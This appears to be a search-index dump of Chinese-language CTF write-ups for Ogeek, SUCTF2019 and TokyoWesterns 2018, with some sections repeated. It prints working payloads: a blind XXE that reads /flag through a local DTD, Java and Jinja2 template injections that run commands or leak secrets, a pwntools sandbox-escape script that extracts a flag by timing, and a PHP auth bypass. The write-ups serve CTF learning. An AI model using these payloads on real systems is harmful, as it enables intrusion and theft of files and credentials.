'.JPG' ; } } function ChangeTime ( obj ){ return obj < 10 ? ( '0' + obj ) : obj ; } \u5176\u4e2d\u8fd8\u6709\u4e00\u4e9b\u4e71\u7801 \u8def\u7531 <http://47.107.253.140:18080/webserver/js/_.js> \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a 1 2 3 4 5 var data = \"<?xml version=\\\"1.0\\\" ?>\\n<request>\\n <status>1</status>\\n</request>\" ; setInterval ( function (){ $ . post ( \"callback\" , data ); }, 10000 ); \u4f20\u9001\u7684\u6570\u636e\u5c31\u662f xml \u6293\u5305 \u4e0d\u65ad\u5730\u53d1\u9001 callback \u4e0d\u80fd\u89e3\u6790PHP\u534f\u8bae \u770b\u6765\u662f\u6709XXE\u7684\u53ef\u80fd\u4e86\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u641e \u7a81\u7136\u53d1\u73b0java\u652f\u6301\u7684\u534f\u8bae\u8fd8\u633a\u591a\u7684 \u4f46\u662f\u5e76\u6ca1\u6709\u4efb\u4f55\u56de\u663e \u4ee5\u4e0b\u662f\u6b63\u89e3 localDTD \u901a\u8fc7 localDTD \u6765\u76f2\u6253xxe \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u53bbLinux\u91cc\u9762\u5168\u5c40\u641c\u7d22\u4e00\u4e2aDTD\u6587\u4ef6\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % condition 'aaa)> aaa)> <!ENTITY &#x25; file SYSTEM \"file:///flag\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message> render \u00b6 \u5f00\u59cb\u4ee5\u4e3aXSS\uff0c\u4f46\u662f\u6ca1\u6210\u529f\u8fc7\u6ee4\u4e86\u5f88\u591a\u3002 \u6b63\u89e3 \u968f\u4fbf\u6d4b\u8bd5\u4e86\u4e00\u4e0b,\u53d1\u73b0[[9*9]]\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86\u8f93\u51fa\u4e8649. \u642d\u914d\u9898\u76ee\u540d\u5b57render,SSTI\u6ca1\u8dd1\u4e86. \u5f88\u96be\u60f3\u5230\u8fd9\u4e9b\uff0c\u9898\u76ee\u89c1\u5c11\u4e86 \u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e2d SSTI \u5f97\u5230payload\u3002\u3002 [[${T(java.lang.System).getenv()}]] \u6267\u884c\u547d\u4ee4: 1 ${T(java.lang.Runtime).getRuntime().exec('catetc/passwd')} \u4f46\u662f\u6ca1\u6709\u56de\u663e,\u6d4b\u8bd5\u4e86 nc,curl,wget \u90fd\u5f39\u4e0d\u51fa\u6765.\u4e0d\u719f\u6089java. \u76f4\u63a5\u8bfb\u6587\u4ef6: 1 [[${new[java.io](qq://txfile/#).BufferedReader(new[java.io](qq://txfile/#).FileReader(\"/flag\")).readLine()}]] misc \u00b6 2019 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:36] C:1 $ zsteg 2019.png --all /usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /mnt/c in PATH, mode 040777 imagedata .. text: \"**\\t;;\\n--\" b1,bgr,lsb,xy .. text: \"(QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==\" b1,bgr,msb,xy .. file: raw G3 (Group 3) FAX b2,rgb,lsb,xy .. file: SoftQuad DESC or font file binary b2,rgb,msb,xy .. file: VISX image file b2,bgr,lsb,xy .. file: SoftQuad DESC or font file binary b2,bgr,msb,xy .. file: VISX image file b8,r,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) \u770b\u5230\u5b57\u7b26\u4e32 QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA== 1 2 3 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:59] $ echo 'QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==' | base64 -d Ao(mgH[]WO,r8US3GM2R2I%YB7st% --->\u6700\u540e\u90a3\u4e2a%\u6ca1\u7528\u641e\u4e0d\u61c2Linux bash\u548b\u56de\u4e8b base85 pybox \u00b6 \u9898\u76ee\u8fd8\u5728\u641e\u4e00\u6ce2 python\u6c99\u7bb1\u9003\u9038\u7684\u77e5\u8bc6\u8fd8\u5728\u603b\u7ed3\u4e2d 1 __import__ . __getattribute__ ( 'func_clo' + 'sure' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'sleep 5' ) \u6700\u7ec8\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * context . log_level = \"debug\" sh = remote ( \"47.112.108.17\" , 12312 , timeout = 300 ) sh . recvuntil ( \">>>\" ) result = \"\" for i in range ( 1 , 46 ): for j in range ( 31 , 255 ): sendtime = time . time () sh . sendline ( \"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -b \" + str ( i ) + \" /home/flag`; [ $a = \\\" \" + chr ( j ) + \" \\\" ] && sleep 3 ')\" ) sh . recvuntil ( \">>>\" ) recvtime = time . time () if recvtime - sendtime > 2 : print ( \"get!\" ) result += chr ( j ) print ( result ) break if j == 254 : print ( str ( i ) + \" unknown!\" ) break print ( result ) \u53c2\u8003 \u00b6 OgeekWP \u5927\u5e08\u5085\u7684blog","title":"Ogeek"},{"location":"writeup/Ogeek/#ogeek","text":"","title":"Ogeek"},{"location":"writeup/Ogeek/#web","text":"","title":"Web"},{"location":"writeup/Ogeek/#enjoy-your-self","text":"\u6253\u5f00\u4e4b\u540e\u662f\u8fd9\u6837\u4e00\u4e2a\u9875\u9762\uff0c\u63d0\u793a time is money \u731c\u6d4b\u662f\u7ade\u4e89 \u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <center><img src=\"../../welcome.png\"></center> <br/> <br/> <?php error_reporting ( 0 ); include \"../../utils/utils.php\" ; if ( isset ( $_REQUEST [ 'filename' ]) and preg_match ( \"/^\\w{8}$/\" , $_REQUEST [ 'filename' ])){ $filename = strtolower ( $_REQUEST [ 'filename' ]); touch ( \"backup/ { $filename } .txt\" ); unlink ( glob ( \"backup/*\" )[ 0 ]); } else { highlight_file ( __FILE__ ); } ?> \\w \u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u7b49\u540c\u4e8e [a-zA-Z0-9_] \u6240\u4ee5\u6b64\u5904\u6b63\u5219\u7684\u542b\u4e49\u5c31\u662f\u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u5f00\u5934\u7684\u6587\u4ef6\u540d\u3002 touch \u4f1a\u91cd\u65b0\u8bbe\u5b9a\u6587\u4ef6\u7684\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa\u3002 unlink \u51fd\u6570\u5220\u9664\u6587\u4ef6\uff0c\u6210\u529f\u65f6\u8fd4\u56de TRUE \uff0c \u6216\u8005\u5728\u5931\u8d25\u65f6\u8fd4\u56de FALSE \u3002 glob \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u6700\u540e\u4e00\u53e5 unlink(glob(\"backup/*\")[0]); \u5f88\u5173\u952e\uff0c\u4f60\u9700\u8981\u77e5\u9053 glob \u5217\u51fa\u7684\u6587\u4ef6\u987a\u5e8f\u662f\u600e\u6837\u7684\uff0c\u8fd9\u91cc\u8981\u8c03\u8bd5\u4e00\u4e0b \u8fd9\u91cc\u5148\u68c0\u67e5\u4e86 filename \u662f\u4e0d\u662f\u516b\u4f4d \u5927\u5c0f\u5199\u5b57\u6bcd\u6216\u8005\u6570\u5b57\u6216\u8005\u4e0b\u5212\u7ebf\u3002\u662f\u7684\u8bdd\u5c31\u521b\u5efa\u4e00\u4e2a\u8fd9\u4e2a\u540d\u5b57\u7684\u6587\u4ef6\u3002\u7136\u540e\u518d\u5217\u6587\u4ef6\uff0c\u5220\u9664\u5217\u51fa\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u8fd9\u91cc\u6709\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u8981\u662f\u5b58\u5728\u5176\u4ed6\u6587\u4ef6\uff0c\u90a3\u5217\u51fa\u6765\u7684\u5c31\u662f\u90a3\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u5220\u4e86\uff0c\u5c31\u6b64\u90a3\u5c31\u53ef\u4ee5\u63a8\u6d4b\u51fa\u90a3\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u4e86\u3002 \u6211\u4eec\u5728\u672c\u5730\u505a\u4e2a\u5b9e\u9a8c\uff0c\u6765\u5c55\u793a\u4e00\u4e0b\u6211\u4eec\u8981\u5220\u9664\u7684\u6587\u4ef6\u3002 \u7136\u540e\u5728 backup \u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c31\u53eb abcdabcd \u5427\u3002 \u7136\u540e\u8bbf\u95ee\u8bd5\u8bd5 /?filename=abcdabcd\u3002 \u8fd9\u4e2a\u6587\u4ef6\u88ab\u5220\u4e86\uff0c\u4f46\u7a0b\u5e8f\u521b\u5efa\u7684abcdabcd.txt \u8fd8\u5b58\u5728\u3002 \u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\u5199\u4e2a\u811a\u672c\uff0c\u6765\u73a9\u73a9\u4eba\u8089\u4e8c\u5206\u6cd5\u5427\u3002 1 2 3 4 5 6 7 8 9 10 11 import requests filename = \"zzzzzzzz\" while True : print ( requests . get ( \"http://47.107.255.20:18088/users/977acc6365a9bc4f1c56accf1331a3bb/\" , params = { \"filename\" : filename }) . text ) r = requests . get ( \"http://47.107.255.20:18088/users/ 977acc6365a9bc4f1c56accf1331a3bb/backup/\" + filename + \".txt\" ) print ( r . status_code ) if r . status_code != 404 : print ( filename ) exit ( 0 ) \u4ece\u53ef\u7528\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4f4d\u5f00\u59cb\u3002\u6d4b\u4e86\u4e0b\u670d\u52a1\u5668\u4f3c\u4e4e\u662f\u6709\u5b9a\u65f6\u91cd\u7f6e\u8fd8\u662f\u5565\u7684\u3002\u6240\u4ee5\u9700\u8981\u591a\u6b21\u5c1d\u8bd5\uff0c\u6709\u4e00\u6b21 200 \u5c31\u8bf4\u660e\u90a3\u4e2a\u6587\u4ef6\u7684\u5b57\u5178\u5e8f\u5728\u524d\u9762\u4e86\u3002 azzzzzzz\u8fd4\u56de 200\uff0c\u8bf4\u660e\u6587\u4ef6\u8fd8\u5728\u524d\u9762\u3002 \u5982\u6b64\u5f80\u590d\uff0c\u8dd1\u51fa\u524d\u4e03\u4f4d\u5b57\u7b26 aefebab\u3002\u7701\u7565\u3002\u3002\u3002\u90a3\u5c31\u8bf4\u660e\u6587\u4ef6\u540d\u662f aefebab8 \u4e86\u3002\u6253\u5f00\u770b\u770b\uff0c\u679c\u7136\u6709\u4e1c\u897f\u3002 \u8bbf\u95ee\u4e4b\u540e\u6709\u4e1c\u897f\uff1a \u53c2\u8003\u5e08\u5085\u7684\u597d\u4e86\u73af\u5883\u6ca1\u4e862333","title":"Enjoy your self"},{"location":"writeup/Ogeek/#look-around","text":"\u663e\u793a\u65f6\u95f4 \u6e90\u4ee3\u7801\u4e2d\u6709 js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 setInterval ( jishi , 1000 ); function jishi (){ var iTime = new Date (); var iYear = iTime . getFullYear (); var iMonth = iTime . getMonth (); var iDate = iTime . getDate (); var iDay = iTime . getDay (); var iHour = iTime . getHours (); var iMinute = iTime . getMinutes (); var iSecond = iTime . getSeconds (); var aPic = document . getElementsByClassName ( 'timePic' ); if ( iDay == '0' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e6\u2014\u00a5' ; } else if ( iDay == '1' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u20ac' ; } else if ( iDay == '2' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u0152' ; } else if ( iDay == '3' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u2030' ; } else if ( iDay == '4' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u203a\u203a' ; } else if ( iDay == '5' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u201d' ; } else { iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u2026\u00ad' ; } var strNew = ChangeTime ( iHour ) + '' + ChangeTime ( iMinute ) + '' + ChangeTime ( iSecond ); //\u00e8\u00bd\u00ac\u00e6\u008d\u00a2\u00e4\u00b8\u00ba\u00e5\u00ad\u2014\u00e7\u00ac\u00a6\u00e4\u00b8\u00b2 for ( var i = 0 ; i < 6 ; i ++ ){ aPic [ i ]. src = 'img/' + strNew . charAt ( i ) + '.JPG' ; } } function ChangeTime ( obj ){ return obj < 10 ? ( '0' + obj ) : obj ; } \u5176\u4e2d\u8fd8\u6709\u4e00\u4e9b\u4e71\u7801 \u8def\u7531 <http://47.107.253.140:18080/webserver/js/_.js> \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a 1 2 3 4 5 var data = \"<?xml version=\\\"1.0\\\" ?>\\n<request>\\n <status>1</status>\\n</request>\" ; setInterval ( function (){ $ . post ( \"callback\" , data ); }, 10000 ); \u4f20\u9001\u7684\u6570\u636e\u5c31\u662f xml \u6293\u5305 \u4e0d\u65ad\u5730\u53d1\u9001 callback \u4e0d\u80fd\u89e3\u6790PHP\u534f\u8bae \u770b\u6765\u662f\u6709XXE\u7684\u53ef\u80fd\u4e86\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u641e \u7a81\u7136\u53d1\u73b0java\u652f\u6301\u7684\u534f\u8bae\u8fd8\u633a\u591a\u7684 \u4f46\u662f\u5e76\u6ca1\u6709\u4efb\u4f55\u56de\u663e \u4ee5\u4e0b\u662f\u6b63\u89e3 localDTD \u901a\u8fc7 localDTD \u6765\u76f2\u6253xxe \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u53bbLinux\u91cc\u9762\u5168\u5c40\u641c\u7d22\u4e00\u4e2aDTD\u6587\u4ef6\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % condition 'aaa)> aaa)> <!ENTITY &#x25; file SYSTEM \"file:///flag\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message>","title":"Look around"},{"location":"writeup/Ogeek/#render","text":"\u5f00\u59cb\u4ee5\u4e3aXSS\uff0c\u4f46\u662f\u6ca1\u6210\u529f\u8fc7\u6ee4\u4e86\u5f88\u591a\u3002 \u6b63\u89e3 \u968f\u4fbf\u6d4b\u8bd5\u4e86\u4e00\u4e0b,\u53d1\u73b0[[9*9]]\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86\u8f93\u51fa\u4e8649. \u642d\u914d\u9898\u76ee\u540d\u5b57render,SSTI\u6ca1\u8dd1\u4e86. \u5f88\u96be\u60f3\u5230\u8fd9\u4e9b\uff0c\u9898\u76ee\u89c1\u5c11\u4e86 \u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e2d SSTI \u5f97\u5230payload\u3002\u3002 [[${T(java.lang.System).getenv()}]] \u6267\u884c\u547d\u4ee4: 1 ${T(java.lang.Runtime).getRuntime().exec('catetc/passwd')} \u4f46\u662f\u6ca1\u6709\u56de\u663e,\u6d4b\u8bd5\u4e86 nc,curl,wget \u90fd\u5f39\u4e0d\u51fa\u6765.\u4e0d\u719f\u6089java. \u76f4\u63a5\u8bfb\u6587\u4ef6: 1 [[${new[java.io](qq://txfile/#).BufferedReader(new[java.io](qq://txfile/#).FileReader(\"/flag\")).readLine()}]]","title":"render"},{"location":"writeup/Ogeek/#misc","text":"","title":"misc"},{"location":"writeup/Ogeek/#2019","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:36] C:1 $ zsteg 2019.png --all /usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /mnt/c in PATH, mode 040777 imagedata .. text: \"**\\t;;\\n--\" b1,bgr,lsb,xy .. text: \"(QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==\" b1,bgr,msb,xy .. file: raw G3 (Group 3) FAX b2,rgb,lsb,xy .. file: SoftQuad DESC or font file binary b2,rgb,msb,xy .. file: VISX image file b2,bgr,lsb,xy .. file: SoftQuad DESC or font file binary b2,bgr,msb,xy .. file: VISX image file b8,r,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) \u770b\u5230\u5b57\u7b26\u4e32 QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA== 1 2 3 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:59] $ echo 'QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==' | base64 -d Ao(mgH[]WO,r8US3GM2R2I%YB7st% --->\u6700\u540e\u90a3\u4e2a%\u6ca1\u7528\u641e\u4e0d\u61c2Linux bash\u548b\u56de\u4e8b base85","title":"2019"},{"location":"writeup/Ogeek/#pybox","text":"\u9898\u76ee\u8fd8\u5728\u641e\u4e00\u6ce2 python\u6c99\u7bb1\u9003\u9038\u7684\u77e5\u8bc6\u8fd8\u5728\u603b\u7ed3\u4e2d 1 __import__ . __getattribute__ ( 'func_clo' + 'sure' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'sleep 5' ) \u6700\u7ec8\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * context . log_level = \"debug\" sh = remote ( \"47.112.108.17\" , 12312 , timeout = 300 ) sh . recvuntil ( \">>>\" ) result = \"\" for i in range ( 1 , 46 ): for j in range ( 31 , 255 ): sendtime = time . time () sh . sendline ( \"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -b \" + str ( i ) + \" /home/flag`; [ $a = \\\" \" + chr ( j ) + \" \\\" ] && sleep 3 ')\" ) sh . recvuntil ( \">>>\" ) recvtime = time . time () if recvtime - sendtime > 2 : print ( \"get!\" ) result += chr ( j ) print ( result ) break if j == 254 : print ( str ( i ) + \" unknown!\" ) break print ( result )","title":"pybox"},{"location":"writeup/Ogeek/#_1","text":"OgeekWP \u5927\u5e08\u5085\u7684blog","title":"\u53c2\u8003"},{"location":"writeup/SUCTF2019/","text":"SUCTF2019 \u00b6 pythonnginx | Web \u00b6 \u8fd9\u9053\u9898\u539f\u5148\u662f\u5229\u7528\u9ed1\u5e3d\u5927\u4f1a\u4e0a\u7684ppt \u4eca\u5929\u53d1\u73b0\u4e86\u4e00\u4e2a\u975e\u9884\u671f\u89e3 \u6d89\u53ca\u5230 urlunsplit \u7684\u6e90\u7801\u5982\u4e0b\uff1a 1 \u53ef\u4ee5\u770b\u5230\u5982\u679c netloc \u4e3a\u7a7a\uff0c\u7167\u6837\u53ef\u4ee5\u6267\u884c\u540e\u9762\u7684if\u8bed\u53e5 \u4e5f\u5c31\u662f\u8bf4 file:////netloc \u4f1a\u88ab\u89e3\u6790\u4e3a file://netloc 1 2 3 4 5 6 7 8 9 10 from urllib.parse import urlsplit , urlunsplit , urlparse url = \"file:////netloc\" part1 = urlsplit ( url ) print ( part1 ) part2 = urlunsplit ( part1 ) print ( part2 ) \u540c\u65f6\u9700\u8981\u77e5\u9053 file:////netloc \u901a\u8fc7 urlparse \u89e3\u6790\u51fa\u6765\u7684 hostname \u662f\u4e3a\u7a7a\u7684 \u6240\u4ee5\u8fd9\u9898\u7684\u975e\u9884\u671f\u89e3\u5c31\u662f\uff1a 1 file:////suctf.cc/../../../../../ \u5f53\u7136\u540e\u9762\u8fd8\u662f\u9700\u8981\u53bb\u8bfbnginx\u7684\u914d\u7f6e\u6587\u4ef6\u7684 \u8fd8\u662f\u5206\u6790\u4e00\u4e0b\u9884\u671f\u89e3\uff1a \u653e\u4e0a\u8fd9\u4e00\u9875\u7ecf\u5178\u7684ppt \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u8981\u627e\u4e00\u4e2a\u5b57\u7b26 \u4ea7\u751funicode\u5b57\u7b26\u7684\u5173\u952e\u4ee3\u7801\uff1a 1 \u53ea\u8981\u901a\u8fc7\u4e86 getUrl \u51fd\u6570\u7684\u68c0\u6d4b\u5373\u53ef \u6bd4\u5982\u8fd9\u4e00\u4e2a\uff1a pythonnginx\u975e\u9884\u671f\u89e3","title":"SUCTF2019"},{"location":"writeup/SUCTF2019/#suctf2019","text":"","title":"SUCTF2019"},{"location":"writeup/SUCTF2019/#pythonnginx-web","text":"\u8fd9\u9053\u9898\u539f\u5148\u662f\u5229\u7528\u9ed1\u5e3d\u5927\u4f1a\u4e0a\u7684ppt \u4eca\u5929\u53d1\u73b0\u4e86\u4e00\u4e2a\u975e\u9884\u671f\u89e3 \u6d89\u53ca\u5230 urlunsplit \u7684\u6e90\u7801\u5982\u4e0b\uff1a 1 \u53ef\u4ee5\u770b\u5230\u5982\u679c netloc \u4e3a\u7a7a\uff0c\u7167\u6837\u53ef\u4ee5\u6267\u884c\u540e\u9762\u7684if\u8bed\u53e5 \u4e5f\u5c31\u662f\u8bf4 file:////netloc \u4f1a\u88ab\u89e3\u6790\u4e3a file://netloc 1 2 3 4 5 6 7 8 9 10 from urllib.parse import urlsplit , urlunsplit , urlparse url = \"file:////netloc\" part1 = urlsplit ( url ) print ( part1 ) part2 = urlunsplit ( part1 ) print ( part2 ) \u540c\u65f6\u9700\u8981\u77e5\u9053 file:////netloc \u901a\u8fc7 urlparse \u89e3\u6790\u51fa\u6765\u7684 hostname \u662f\u4e3a\u7a7a\u7684 \u6240\u4ee5\u8fd9\u9898\u7684\u975e\u9884\u671f\u89e3\u5c31\u662f\uff1a 1 file:////suctf.cc/../../../../../ \u5f53\u7136\u540e\u9762\u8fd8\u662f\u9700\u8981\u53bb\u8bfbnginx\u7684\u914d\u7f6e\u6587\u4ef6\u7684 \u8fd8\u662f\u5206\u6790\u4e00\u4e0b\u9884\u671f\u89e3\uff1a \u653e\u4e0a\u8fd9\u4e00\u9875\u7ecf\u5178\u7684ppt \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u8981\u627e\u4e00\u4e2a\u5b57\u7b26 \u4ea7\u751funicode\u5b57\u7b26\u7684\u5173\u952e\u4ee3\u7801\uff1a 1 \u53ea\u8981\u901a\u8fc7\u4e86 getUrl \u51fd\u6570\u7684\u68c0\u6d4b\u5373\u53ef \u6bd4\u5982\u8fd9\u4e00\u4e2a\uff1a pythonnginx\u975e\u9884\u671f\u89e3","title":"pythonnginx | Web"},{"location":"writeup/TokyoCTF/","text":"\u4e1c\u4eacCTF wp2018 \u00b6 \u9898\u76ee\u4ed3\u5e93 writeup writeup shrine \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) Although config and self are unset, request is still available. I believed that app.config may be somewhere.. To search for it, I wrote a function to traverse over child attributes of request recursively: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # search.py def search ( obj , max_depth ): visited_clss = [] visited_objs = [] def visit ( obj , path = 'obj' , depth = 0 ): yield path , obj if depth == max_depth : return elif isinstance ( obj , ( int , float , bool , str , bytes )): return elif isinstance ( obj , type ): if obj in visited_clss : return visited_clss . append ( obj ) print ( obj ) else : if obj in visited_objs : return visited_objs . append ( obj ) # attributes for name in dir ( obj ): if name . startswith ( '__' ) and name . endswith ( '__' ): if name not in ( '__globals__' , '__class__' , '__self__' , '__weakref__' , '__objclass__' , '__module__' ): continue attr = getattr ( obj , name ) yield from visit ( attr , '{}.{}' . format ( path , name ), depth + 1 ) # dict values if hasattr ( obj , 'items' ) and callable ( obj . items ): try : for k , v in obj . items (): yield from visit ( v , '{}[{}]' . format ( path , repr ( k )), depth ) except : pass # items elif isinstance ( obj , ( set , list , tuple , frozenset )): for i , v in enumerate ( obj ): yield from visit ( v , '{}[{}]' . format ( path , repr ( i )), depth ) yield from visit ( obj ) \u540c\u65f6\u4fee\u6539app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os from flask import request from search import search app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = 'TWCTF_FLAG' @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): for path , obj in search ( request , 10 ): if str ( obj ) == app . config [ 'FLAG' ]: return path if __name__ == '__main__' : app . run ( debug = True ) (tql\u8fd9\u4e2a\u5199\u7684) 1 2 3 4 5 6 7 $ python3 app . py & $ curl 0 : 5000 / shrine / 123 obj . application . __self__ . _get_data_for_json . __globals__ [ 'json' ] . JSONEncoder . default . __globals__ [ 'current_app' ] . config [ 'FLAG' ] $ curl - g \"http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\" TWCTF { pray_f0r_sacred_jinja2 } \u53e6\u4e00\u79cd\u89e3\u6cd5 \u00b6 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__}} \u7136\u540e\u641c\u7d22\uff1a After (CTRL+F)ed \u201cFlask\u201d word i just found an interesting variable called:current_app \u8bbf\u95ee\uff1a http://shrine.chal.ctf.westerns.tokyo/shrine/ > {{url_for. globals .current_app}} It means that we are in the application app.py again, so let\u2019s try to get in config now! 1 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__.current_app.config}} \u6210\u529f\uff01 shrine SimpleAuth \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php require_once 'flag.php' ; if ( ! empty ( $_SERVER [ 'QUERY_STRING' ])) { $query = $_SERVER [ 'QUERY_STRING' ]; $res = parse_str ( $query ); if ( ! empty ( $res [ 'action' ])){ $action = $res [ 'action' ]; } } if ( $action === 'auth' ) { if ( ! empty ( $res [ 'user' ])) { $user = $res [ 'user' ]; } if ( ! empty ( $res [ 'pass' ])) { $pass = $res [ 'pass' ]; } if ( ! empty ( $user ) && ! empty ( $pass )) { $hashed_password = hash ( 'md5' , $user . $pass ); } if ( ! empty ( $hashed_password ) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e' ) { echo $flag ; } else { echo 'fail :(' ; } } else { highlight_file ( __FILE__ ); } ?> \u6784\u9020URL 1 http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e slack emoji converter \u00b6 \u5f97\u5230\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from flask import ( Flask , render_template , request , redirect , url_for , make_response , ) from PIL import Image import tempfile import os app = Flask ( __name__ ) @app.route ( '/' ) def index (): return render_template ( 'index.html' ) @app.route ( '/source' ) def source (): return open ( __file__ ) . 